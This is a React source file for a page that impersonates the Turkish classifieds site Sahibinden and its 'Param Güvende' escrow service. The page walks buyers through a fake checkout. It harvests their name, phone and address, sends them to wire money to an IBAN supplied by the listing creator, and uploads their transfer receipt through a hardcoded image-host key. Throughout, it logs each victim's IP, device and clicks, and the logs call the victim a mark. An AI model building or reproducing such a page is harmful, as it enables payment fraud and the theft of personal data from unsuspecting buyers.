'use client';

import { useState, useRef, useEffect } from 'react';

interface SahibindenTemplateProps {
    data: any;
    idOrSlug: string;
}

export default function SahibindenTemplate({ data, idOrSlug }: SahibindenTemplateProps) {
    const [mevcutAdim, setMevcutAdim] = useState(1);
    const [form, setForm] = useState({
        adresAdi: '',
        aliciAd: '',
        aliciSoyad: '',
        aliciTel: '',
        aliciIl: '',
        aliciIlce: '',
        aliciMahalle: '',
        aliciAciKAdres: ''
    });
    
    const [errors, setErrors] = useState<any>({});
    const [turkeyData, setTurkeyData] = useState<any[]>([]);
    const [secilenDekontDosyasi, setSecilenDekontDosyasi] = useState<File | null>(null);
    const [isProcessing, setIsProcessing] = useState(false);
    const [isCompleted, setIsCompleted] = useState(false);
    const [activeTab, setActiveTab] = useState('tab-bilgi');
    const [isDescExpanded, setIsDescExpanded] = useState(false);
    const [isFav, setIsFav] = useState(false);
    
    const fileInputRef = useRef<HTMLInputElement>(null);

    useEffect(() => {
        const fetchTurkeyData = async () => {
            try {
                const response = await fetch("https://turkiyeapi.dev/api/v1/provinces");
                const json = await response.json();
                const sorted = json.data.sort((a: any, b: any) => a.name.localeCompare(b.name));
                setTurkeyData(sorted);
            } catch (error) {}
        };
        fetchTurkeyData();
        logAction("İlana Giriş Yaptı", "Eleman vitrini inceliyor.");
    }, []);

    const logAction = async (aksiyon: string, detay: string = "") => {
        if (!data) return;
        try {
            let ip = "Bilinmiyor";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (e) {}

            const ua = navigator.userAgent;
            let cihaz = "Diğer/PC";
            if (/iPhone|iPad|iPod/i.test(ua)) cihaz = "Apple iOS";
            else if (/Android/i.test(ua)) cihaz = "Android";

            await fetch(`/api/log-ekle`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    saticiId: data.olusturanMusteri,
                    ilanBasligi: data.urunAdi || "Bilinmiyor",
                    saticiAdi: data.saticiAdi || "Bilinmiyor",
                    fiyat: (data.fiyat || 0) + " TL",
                    sablon: "Şablon 1 (Sarı)",
                    aksiyon,
                    detay,
                    ip,
                    cihaz,
                    tarih: new Date().toLocaleDateString('tr-TR'),
                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
                })
            });
        } catch (e) {}
    };

    const formatPrice = (num: number, kusurat = false) => {
        return new Intl.NumberFormat('tr-TR', { 
            minimumFractionDigits: kusurat ? 2 : 0, 
            maximumFractionDigits: kusurat ? 2 : 0 
        }).format(num);
    };

    const validateStep3 = () => {
        const newErrors: any = {};
        if (!form.adresAdi) newErrors.adresAdi = true;
        if (!form.aliciAd) newErrors.aliciAd = true;
        if (!form.aliciSoyad) newErrors.aliciSoyad = true;
        if (!form.aliciTel || form.aliciTel === '+90 ') newErrors.aliciTel = true;
        if (!form.aliciIl) newErrors.aliciIl = true;
        if (!form.aliciIlce) newErrors.aliciIlce = true;
        if (!form.aliciMahalle) newErrors.aliciMahalle = true;
        if (!form.aliciAciKAdres) newErrors.aliciAciKAdres = true;
        
        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleNext = async () => {
        if (mevcutAdim === 1) {
            setMevcutAdim(2);
            logAction("Satın Al'a Bastı", "Sipariş özeti ekranına geçti.");
        } else if (mevcutAdim === 2) {
            setMevcutAdim(3);
            logAction("Özeti Onayladı", "Adres girme ekranına geçti.");
        } else if (mevcutAdim === 3) {
            if (validateStep3()) {
                setMevcutAdim(4);
                logAction("Adresi Kaydetti", `Ödeme ekranına geçti. Şehir: ${form.aliciIl} / ${form.aliciIlce}`);
            }
        } else if (mevcutAdim === 4) {
            if (!secilenDekontDosyasi) {
                alert("Lütfen ödeme dekontunuzu seçin.");
                return;
            }
            handleCompleteOrder();
        }
        window.scrollTo(0, 0);
    };

    const handleBack = () => {
        if (mevcutAdim > 1) {
            const prevAdim = mevcutAdim - 1;
            setMevcutAdim(prevAdim);
            logAction("Geri Tuşuna Bastı", `Adım ${prevAdim}'e geri döndü.`);
        } else {
            window.location.href = 'https://www.sahibinden.com';
        }
    };

    const handleCompleteOrder = async () => {
        setIsProcessing(true);
        try {
            const apiKey = "De087c486b0f12c525ef31688d64dcf0";
            const formData = new FormData();
            formData.append("image", secilenDekontDosyasi!);
            
            const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData });
            const imgData = await imgRes.json();
            
            if (!imgData.success) throw new Error("Dekont yüklenemedi.");
            
            const dekontUrl = imgData.data.url;
            const tamAdres = `${form.aliciIl} / ${form.aliciIlce} - ${form.aliciMahalle} - ${form.aliciAciKAdres}`;

            const res = await fetch('/api/siparis-tamamla', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ilanId: data.docId || idOrSlug,
                    saticiId: data.olusturanMusteri,
                    ilanBasligi: data.urunAdi,
                    aliciAd: `${form.aliciAd} ${form.aliciSoyad}`,
                    aliciTel: form.aliciTel,
                    aliciAdres: tamAdres,
                    dekontUrl
                })
            });

            if (res.ok) {
                logAction("BAŞARILI BİTİŞ", "Eleman dekontu yükledi ve siparişi tamamladı.");
                setIsCompleted(true);
            } else {
                throw new Error("Sipariş işlenemedi.");
            }
        } catch (e: any) {
            alert(e.message || "Bir hata oluştu.");
        } finally {
            setIsProcessing(false);
        }
    };

    const safFiyat = parseFloat(data.fiyat) || 0;
    const hizmetBedeli = safFiyat * 0.05;
    const toplamTutar = safFiyat + hizmetBedeli;

    return (
        <div className="shb-body">
            <style jsx global>{`
                :root {
                    --shb-yellow: #ffe800;
                    --shb-blue: #0059a3;
                    --shb-green: #00a651;
                    --shb-dark: #333333;
                    --shb-bg: #f3f4f7;
                    --shb-border: #e2e2e2;
                    --prem-rozet-bg: #48b8a6; 
                    --trust-icon-color: #16b4a1;
                }
                .shb-body {
                    background-color: var(--shb-bg);
                    color: var(--shb-dark);
                    font-family: "Lucida Grande", "Lucida Sans", "Arial", sans-serif;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    margin: 0;
                    padding: 0;
                    width: 100%;
                }
                .app-container {
                    width: 100%;
                    max-width: 480px;
                    background: var(--shb-bg);
                    min-height: 100vh;
                    position: relative;
                    padding-bottom: 80px;
                }
                .header {
                    background-color: var(--shb-blue);
                    position: sticky;
                    top: 0;
                    z-index: 1000;
                    color: #fff;
                    height: 60px; 
                    padding: 0 15px; 
                    display: grid; 
                    grid-template-columns: 50px 1fr 90px; 
                    align-items: center;
                    border-bottom: 1px solid rgba(255,255,255,0.1);
                }
                .header-title {
                    grid-column: 2; 
                    justify-self: center; 
                    text-align: center;
                    font-size: 17px; 
                    font-weight: 600;
                    letter-spacing: 0.5px;
                }
                .back-btn {
                    grid-column: 1; 
                    justify-self: start; 
                    font-size: 26px; 
                    color: #fff;
                    text-decoration: none;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                }
                .header-right {
                    grid-column: 3; 
                    justify-self: end; 
                    display: flex;
                    align-items: center;
                    gap: 18px; 
                }
                .image-gallery-section { position: relative; background: #fff; border-bottom: 1px solid var(--shb-border); }
                .prem-rozet {
                    position: absolute; top: 12px; left: 12px; height: 28px; 
                    background-color: var(--prem-rozet-bg); border-radius: 14px; 
                    display: flex; align-items: center; padding: 0 12px 0 8px; gap: 6px; z-index: 10; 
                    box-shadow: 0 2px 5px rgba(0,0,0,0.15); 
                }
                .prem-rozet span { color: #fff; font-size: 13px; font-weight: 500; }
                .gallery-wrap { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; width: 100%; scrollbar-width: none; }
                .gallery-wrap::-webkit-scrollbar { display: none; }
                .gallery-wrap img { width: 100%; height: 300px; flex-shrink: 0; object-fit: contain; scroll-snap-align: center; }
                .info-header-card { background: #fff; padding: 12px 15px 2px 15px; text-align: center; }
                .cat-tree { font-size: 12px; color: #0059a3; margin-bottom: 6px; }
                .gray-address { font-size: 13px; color: #888; }
                .tabs { display: flex; border-bottom: 3px solid #ffcc00; background: #fff; padding: 0 10px; }
                .tab-btn {
                    flex: 1; padding: 12px; text-align: center; font-size: 15px; color: #333; cursor: pointer;
                    background: #fff; border: 1px solid #aaa; border-bottom: none; border-radius: 3px 3px 0 0; margin-right: 5px;
                }
                .tab-btn.active { background-color: #ffcc00; border-color: #ffcc00; }
                .product-price { font-size: 26px; font-weight: bold; color: var(--shb-blue); margin-bottom: 10px; }
                .product-title { font-size: 16px; font-weight: bold; margin-bottom: 10px; line-height: 1.4; }
                .desc-box { font-size: 14px; line-height: 1.6; color: #444; margin-bottom: 5px; }
                .desc-kisitli { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
                .daha-fazla-btn { background: none; border: none; color: #0059a3; font-weight: bold; font-size: 13px; cursor: pointer; padding: 0; margin-bottom: 20px; }
                .details-table { width: 100%; border-collapse: collapse; font-size: 14px; border-top: 1px solid var(--shb-border); }
                .details-table td { padding: 12px 0; border-bottom: 1px solid var(--shb-border); }
                .details-table td:first-child { color: #888; width: 40%; }
                .details-table td:last-child { text-align: right; color: #888; }
                .seller-card { border: 1px solid var(--shb-border); padding: 15px; border-radius: 4px; display: flex; align-items: center; gap: 15px; margin-top: 30px; background: #fafafa; }
                .seller-avatar { width: 50px; height: 50px; background: #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 20px; }
                .seller-info h4 { font-size: 16px; color: var(--shb-blue); margin-bottom: 3px; }
                .seller-info p { font-size: 12px; color: #666; }
                .bottom-bar { position: fixed; bottom: 0; width: 100%; max-width: 480px; padding: 10px 15px; display: flex; gap: 10px; z-index: 100; }
                .btn { flex: 1; padding: 14px; border: none; border-radius: 3px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; color: white; box-shadow: 0 2px 6px rgba(0,0,0,0.15); }
                .btn-buy { background: #16b4a1; }
                .btn-call { background: var(--shb-blue); border: 1px solid var(--shb-blue); }
                .btn:disabled { background: #ccc !important; color: #666 !important; }
                
                /* Step 2+ */
                .s2-header-title, .s3-header { background-color: #f3f4f7; color: #888; font-size: 12px; font-weight: bold; padding: 12px 15px; text-transform: uppercase; border-bottom: 1px solid var(--shb-border); }
                .s2-product-row { display: flex; gap: 15px; padding: 15px; border-bottom: 1px solid var(--shb-border); background: #fff; }
                .s2-product-row img { width: 75px; height: 75px; object-fit: cover; border-radius: 4px; border: 1px solid var(--shb-border); }
                .s2-price-list { list-style: none; padding: 0 15px; background: #fff; font-size: 14px; color: #555; }
                .s2-price-list li { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--shb-border); }
                .s2-price-list .total { font-weight: bold; color: #333; }
                .s2-price-list .total span:last-child { color: var(--shb-blue); font-size: 16px; }
                .s2-delivery-note { font-size: 12px; color: #777; padding: 15px; border-bottom: 15px solid #f3f4f7; background: #fff; }
                .s2-trust-badges { padding: 20px 15px; background: #fff; }
                .trust-badge-item { display: flex; align-items: flex-start; gap: 15px; margin-bottom: 20px; }
                .trust-badge-content h4 { font-size: 15px; color: #333; margin-bottom: 4px; font-weight: 700; }
                .trust-badge-content p { font-size: 13px; color: #666; line-height: 1.4; }
                
                /* Form Styling */
                .s3-form-container { padding: 0 15px; background: #fff; }
                .s3-input-group { position: relative; padding-top: 20px; }
                .s3-input-group input, .s3-input-group select { 
                    width: 100%; padding: 8px 0; border: none; border-bottom: 1px solid var(--shb-border); 
                    font-size: 15px; color: #333; background: transparent; outline: none; border-radius: 0;
                }
                .s3-input-group label {
                    position: absolute; top: 28px; left: 0; font-size: 15px; color: #888;
                    transition: 0.2s ease all; pointer-events: none;
                }
                .s3-input-group input:focus ~ label,
                .s3-input-group input:not(:placeholder-shown) ~ label,
                .s3-input-group select:focus ~ label,
                .s3-input-group select:not([value=""]) ~ label {
                    top: 0px; font-size: 12px; color: var(--shb-blue);
                }
                .s3-input-group.has-error input, .s3-input-group.has-error select { border-bottom: 2px solid #d32f2f; }
                .s3-input-group.has-error label { color: #d32f2f; }
                .s3-error-msg { display: none; color: #d32f2f; font-size: 11px; margin-top: 4px; }
                .s3-input-group.has-error .s3-error-msg { display: block; }
                
                .iban-box { background: #f9f9f9; border: 1px solid #ccc; padding: 15px; margin: 15px; border-radius: 3px; }
                .iban-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
                .iban-row h3 { font-size: 11px; color: #666; margin-bottom: 2px; }
                .iban-row p { font-size: 14px; font-weight: bold; }
                .copy-btn { background: #fff; border: 1px solid var(--shb-blue); color: var(--shb-blue); padding: 4px 10px; border-radius: 3px; font-size: 11px; font-weight: bold; }
                .upload-box { border: 2px dashed #ccc; padding: 25px 15px; text-align: center; background: #fafafa; margin: 15px; cursor: pointer; color: #666; font-size: 14px; }
                
                .shb-error-card { 
                    display: flex; flex-direction: column; align-items: center; justify-content: center; 
                    padding: 60px 20px; text-align: center; background: #fff; margin: 20px auto; 
                    max-width: 440px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid var(--shb-border); 
                }
                .error-icon { width: 70px; height: 70px; background: #f8f9fa; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; border: 1px solid var(--shb-border); }
                .error-icon svg { width: 35px; height: 35px; fill: #999; }
                .error-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
                .error-desc { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }
                .error-btn { background: var(--shb-blue); color: #fff; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; font-size: 14px; }
            `}</style>

            <div className="app-container">
                <div className="header">
                    <div className="back-btn" onClick={handleBack}>{mevcutAdim === 2 ? '✕' : '❮'}</div>
                    <div className="header-title">
                        {mevcutAdim === 1 ? 'İlan Detayı' : 
                         mevcutAdim === 2 ? 'Ürün bilgileri' : 
                         mevcutAdim === 3 ? 'Teslimat ve ödeme' : 'Banka Havalesi / EFT'}
                    </div>
                    {mevcutAdim === 1 && (
                        <div className="header-right">
                            <div className="share-btn" style={{ cursor: 'pointer' }} onClick={() => {
                                navigator.clipboard.writeText(window.location.href);
                                alert("Link kopyalandı!");
                            }}>
                                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path><polyline points="16 6 12 2 8 6"></polyline><line x1="12" y1="2" x2="12" y2="15"></line></svg>
                            </div>
                            <div className={`fav-btn ${isFav ? 'filled' : ''}`} style={{ cursor: 'pointer' }} onClick={() => setIsFav(!isFav)}>
                                <svg width="24" height="24" viewBox="0 0 24 24" fill={isFav ? "#ffcc00" : "none"} stroke={isFav ? "#ffcc00" : "currentColor"} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
                            </div>
                        </div>
                    )}
                </div>

                {isCompleted ? (
                    <div style={{ textAlign: 'center', padding: '40px 10px', background: '#fff', minHeight: '300px', margin: '20px' }}>
                        <h2 style={{ color: '#00a651', marginBottom: '15px', fontSize: '24px' }}>Siparişiniz Başarılı!</h2>
                        <p style={{ color: '#333', fontSize: '15px', lineHeight: '1.6' }}>Ödemeniz ve dekontunuz satıcıya iletilmiştir. Sipariş durumunu satıcıdan takip edebilirsiniz.</p>
                    </div>
                ) : (
                    <>
                        {mevcutAdim === 1 && (
                            <div id="step1">
                                <div className="image-gallery-section">
                                    <div className="prem-rozet">
                                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#fff" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
                                        <span>Param Güvende</span>
                                    </div>
                                    <div className="gallery-wrap">
                                        {(data.resimler && data.resimler.length > 0) ? 
                                            data.resimler.map((img: string, i: number) => <img key={i} src={img} alt="" />) : 
                                            <img src={data.anaResim} alt="" />
                                        }
                                    </div>
                                </div>
                                
                                <div className="info-header-card">
                                    <div className="cat-tree">{data.kategoriAgaci || "Kategori Belirtilmemiş"}</div>
                                    <div className="gray-address">📍 {data.sehir}</div>
                                </div>
                                
                                <div style={{ background: '#fff', marginBottom: '10px' }}>
                                    <div className="tabs">
                                        <div className={`tab-btn ${activeTab === 'tab-bilgi' ? 'active' : ''}`} onClick={() => setActiveTab('tab-bilgi')}>İlan Bilgileri</div>
                                        <div className={`tab-btn ${activeTab === 'tab-konum' ? 'active' : ''}`} onClick={() => setActiveTab('tab-konum')}>Konumu</div>
                                    </div>
                                    
                                    <div style={{ padding: '15px' }}>
                                        {activeTab === 'tab-bilgi' ? (
                                            <div>
                                                <div className="product-price">{formatPrice(safFiyat)} TL</div>
                                                <div className="product-title">{data.urunAdi}</div>
                                                <div className={`desc-box ${!isDescExpanded ? 'desc-kisitli' : ''}`}>
                                                    {data.urunAciklamasi || "Açıklama girilmemiş."}
                                                </div>
                                                <button className="daha-fazla-btn" onClick={() => setIsDescExpanded(!isDescExpanded)}>
                                                    {isDescExpanded ? 'Daha az göster' : 'Daha fazla göster'}
                                                </button>

                                                <table className="details-table">
                                                    <tbody>
                                                        {Array.isArray(data.dinamikOzellikler) && data.dinamikOzellikler.map((item: any, i: number) => (
                                                            <tr key={i}>
                                                                <td>{item.anahtar}</td>
                                                                <td style={item.anahtar === 'İlan No' ? { color: '#8b0000', fontWeight: 'bold' } : {}}>{item.deger}</td>
                                                            </tr>
                                                        ))}
                                                    </tbody>
                                                </table>
                                                
                                                <div className="seller-card">
                                                    <div className="seller-avatar">👤</div>
                                                    <div className="seller-info">
                                                        <h4>{data.saticiAdi}</h4>
                                                        <p>Hesap Açılış: {data.hesapTarihi || "Belirtilmemiş"}</p>
                                                    </div>
                                                </div>
                                            </div>
                                        ) : (
                                            <div style={{ width: '100%', height: '350px', borderRadius: '5px', overflow: 'hidden', position: 'relative' }}>
                                                <iframe 
                                                    src={`https://maps.google.com/maps?q=${encodeURIComponent(data.sehir)}&t=&z=11&ie=UTF8&iwloc=&output=embed`} 
                                                    width="100%" height="350" style={{ border: 0 }} loading="lazy" 
                                                />
                                                <div style={{ position: 'absolute', bottom: '20px', left: '50%', transform: 'translateX(-50%)', background: '#fff', padding: '10px 24px', borderRadius: '30px', fontSize: '14px', color: '#444', boxShadow: '0 4px 15px rgba(0,0,0,0.15)', whiteSpace: 'nowrap' }}>
                                                    {data.sehir}
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 2 && (
                            <div id="step2">
                                <div className="s2-header-title">SİPARİŞ ÖZETİ</div>
                                <div className="s2-product-row">
                                    <img src={data.anaResim || (data.resimler && data.resimler[0])} alt="" />
                                    <div className="s2-title">{data.urunAdi}</div>
                                </div>
                                <ul className="s2-price-list">
                                    <li><span>Ürün bedeli</span> <span>{formatPrice(safFiyat)} TL</span></li>
                                    <li><span>S - Param Güvende Hizmet Bedeli</span> <span>{formatPrice(hizmetBedeli)} TL</span></li>
                                    <li><span>Kargo ücreti</span> <span style={{ color: '#666' }}>Ücretsiz</span></li>
                                    <li className="total"><span>Toplam tutar</span> <span>{formatPrice(toplamTutar, true)} TL</span></li>
                                </ul>
                                <div className="s2-delivery-note">Ürün, satıcı tarafından 3 iş gününde kargoya verilir.</div>
                                <div className="s2-trust-badges">
                                    <div className="trust-badge-item">
                                        <div className="trust-badge-icon">
                                            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--trust-icon-color)" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
                                        </div>
                                        <div className="trust-badge-content">
                                            <h4>Paranız Güvende</h4>
                                            <p>Ödemeniz siz ürünü teslim alıp onayladıktan sonra satıcıya aktarılır.</p>
                                        </div>
                                    </div>
                                    <div className="trust-badge-item">
                                        <div className="trust-badge-icon">
                                            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--trust-icon-color)" strokeWidth="2"><rect x="1" y="3" width="15" height="13" rx="1.5"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
                                        </div>
                                        <div className="trust-badge-content">
                                            <h4>Ücretsiz Kargo</h4>
                                            <p>Aldığınız ürün Yurtiçi ya da PTT kargo ile tarafınıza ücretsiz olarak kargolanır.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 3 && (
                            <div id="step3">
                                <div className="s3-header">ADRES BİLGİLERİ</div>
                                <div className="s3-form-container">
                                    {[
                                        { id: 'adresAdi', label: 'Adres adı', err: 'Bir adres adı girin.' },
                                        { id: 'aliciAd', label: 'Ad', err: 'Adınızı girin.' },
                                        { id: 'aliciSoyad', label: 'Soyad', err: 'Soyadınızı girin.' },
                                        { id: 'aliciTel', label: 'Telefon', err: 'Telefon numaranızı girin.', type: 'tel' },
                                    ].map(field => (
                                        <div key={field.id} className={`s3-input-group ${errors[field.id] ? 'has-error' : ''}`}>
                                            <input 
                                                type={field.type || 'text'} 
                                                id={field.id} 
                                                placeholder=" " 
                                                value={(form as any)[field.id]} 
                                                onChange={(e) => {
                                                    setForm({ ...form, [field.id]: e.target.value });
                                                    setErrors({ ...errors, [field.id]: false });
                                                }}
                                                onFocus={() => {
                                                    if (field.id === 'aliciTel' && !form.aliciTel) setForm({...form, aliciTel: '+90 '});
                                                }}
                                            />
                                            <label>{field.label}</label>
                                            <div className="s3-error-msg">{field.err}</div>
                                        </div>
                                    ))}
                                    
                                    <div className={`s3-input-group ${errors.aliciIl ? 'has-error' : ''}`}>
                                        <select 
                                            value={form.aliciIl} 
                                            onChange={(e) => {
                                                setForm({ ...form, aliciIl: e.target.value, aliciIlce: '' });
                                                setErrors({ ...errors, aliciIl: false });
                                            }}
                                        >
                                            <option value=""></option>
                                            {turkeyData.map(il => <option key={il.id} value={il.name}>{il.name}</option>)}
                                        </select>
                                        <label>İl</label>
                                        <div className="s3-error-msg">İl seçin.</div>
                                    </div>

                                    <div className={`s3-input-group ${errors.aliciIlce ? 'has-error' : ''}`}>
                                        <select 
                                            value={form.aliciIlce} 
                                            onChange={(e) => {
                                                setForm({ ...form, aliciIlce: e.target.value });
                                                setErrors({ ...errors, aliciIlce: false });
                                            }}
                                            disabled={!form.aliciIl}
                                        >
                                            <option value=""></option>
                                            {form.aliciIl && turkeyData.find(il => il.name === form.aliciIl)?.districts.map((d: any) => (
                                                <option key={d.id} value={d.name}>{d.name}</option>
                                            ))}
                                        </select>
                                        <label>İlçe</label>
                                        <div className="s3-error-msg">İlçe seçin.</div>
                                    </div>

                                    {[
                                        { id: 'aliciMahalle', label: 'Mahalle', err: 'Lütfen mahalle bilginizi girin.' },
                                        { id: 'aliciAciKAdres', label: 'Açık adres', err: 'Açık adresinizi girin.' }
                                    ].map(field => (
                                        <div key={field.id} className={`s3-input-group ${errors[field.id] ? 'has-error' : ''}`}>
                                            <input 
                                                type="text" 
                                                placeholder=" " 
                                                value={(form as any)[field.id]} 
                                                onChange={(e) => {
                                                    setForm({ ...form, [field.id]: e.target.value });
                                                    setErrors({ ...errors, [field.id]: false });
                                                }}
                                            />
                                            <label>{field.label}</label>
                                            <div className="s3-error-msg">{field.err}</div>
                                        </div>
                                    ))}
                                </div>
                                <div className="s3-kvkk-text" style={{ padding: '15px', fontSize: '11px', color: '#888', lineHeight: '1.4' }}>
                                    Kişisel verilerin korunması hakkında detaylı bilgiye <a href="#" onClick={(e) => e.preventDefault()} style={{ color: 'var(--shb-blue)', textDecoration: 'none' }}>buradan</a> ulaşabilirsiniz.
                                </div>
                            </div>
                        )}

                        {mevcutAdim === 4 && (
                            <div id="step4" style={{ background: '#fff', padding: '15px', borderTop: '1px solid #eee' }}>
                                <div style={{ fontSize: '18px', fontWeight: 'bold', marginBottom: '10px' }}>Banka Havalesi / EFT</div>
                                <p style={{ fontSize: '13px', color: '#555', marginBottom: '15px', lineHeight: '1.4' }}>Siparişi tamamlamak için aşağıdaki hesaba ödemenizi yapın ve dekontunuzu yükleyin.</p>
                                
                                <div className="iban-box">
                                    <div className="iban-row">
                                        <div><h3>ALICI IBAN</h3><p>{data.iban?.split('-')[0].trim() || 'TR00...'}</p></div>
                                        <button className="copy-btn" onClick={() => {
                                            navigator.clipboard.writeText(data.iban?.split('-')[0].trim());
                                            alert('Kopyalandı');
                                        }}>Kopyala</button>
                                    </div>
                                    <hr style={{ border: 'none', borderTop: '1px solid #ddd', marginBottom: '15px' }} />
                                    <div className="iban-row" style={{ marginBottom: 0 }}>
                                        <div><h3>ALICI AD SOYAD</h3><p>{data.iban?.split('-')[1]?.trim() || data.saticiAdi}</p></div>
                                        <button className="copy-btn" onClick={() => {
                                            navigator.clipboard.writeText(data.iban?.split('-')[1]?.trim() || data.saticiAdi);
                                            alert('Kopyalandı');
                                        }}>Kopyala</button>
                                    </div>
                                </div>

                                <input 
                                    type="file" 
                                    ref={fileInputRef} 
                                    accept="image/*" 
                                    style={{ display: 'none' }} 
                                    onChange={(e) => {
                                        if (e.target.files?.[0]) {
                                            setSecilenDekontDosyasi(e.target.files[0]);
                                            logAction("Dekont Dosyası Seçti", `Dosya Adı: ${e.target.files[0].name}`);
                                        }
                                    }}
                                />
                                <div 
                                    className="upload-box" 
                                    onClick={() => fileInputRef.current?.click()}
                                    style={secilenDekontDosyasi ? { borderColor: '#00a651', color: '#00a651' } : {}}
                                >
                                    {secilenDekontDosyasi ? `Dekont Seçildi: ${secilenDekontDosyasi.name}` : 'Dekont Eklemek İçin Tıklayın'}
                                    <span style={{ fontSize: '11px', color: '#999', display: 'block', marginTop: '5px' }}>(Max 5MB - JPG/PNG)</span>
                                </div>
                                {isProcessing && <div style={{ textAlign: 'center', marginTop: '15px', fontWeight: 'bold', color: '#0059a3' }}>İşleniyor...</div>}
                            </div>
                        )}

                        <div className="bottom-bar">
                            {mevcutAdim === 1 && (
                                <button className="btn btn-call" onClick={() => {
                                    logAction("Arama Butonuna Bastı", "Satıcıyı aramaya çalıştı.");
                                    window.location.href = `tel:${data.saticiTel}`;
                                }}>Ara</button>
                            )}
                            <button 
                                className="btn btn-buy" 
                                onClick={handleNext} 
                                disabled={isProcessing}
                                style={mevcutAdim >= 2 ? { background: 'var(--shb-blue)' } : {}}
                            >
                                {mevcutAdim === 1 ? 'Satın Al' : 
                                 mevcutAdim === 2 ? 'Ödemeye geç' : 
                                 mevcutAdim === 3 ? 'Kaydet ve ödemeye geç' : 'Ödemeyi Tamamla'}
                            </button>
                        </div>
                    </>
                )}
            </div>
        </div>
    );
}
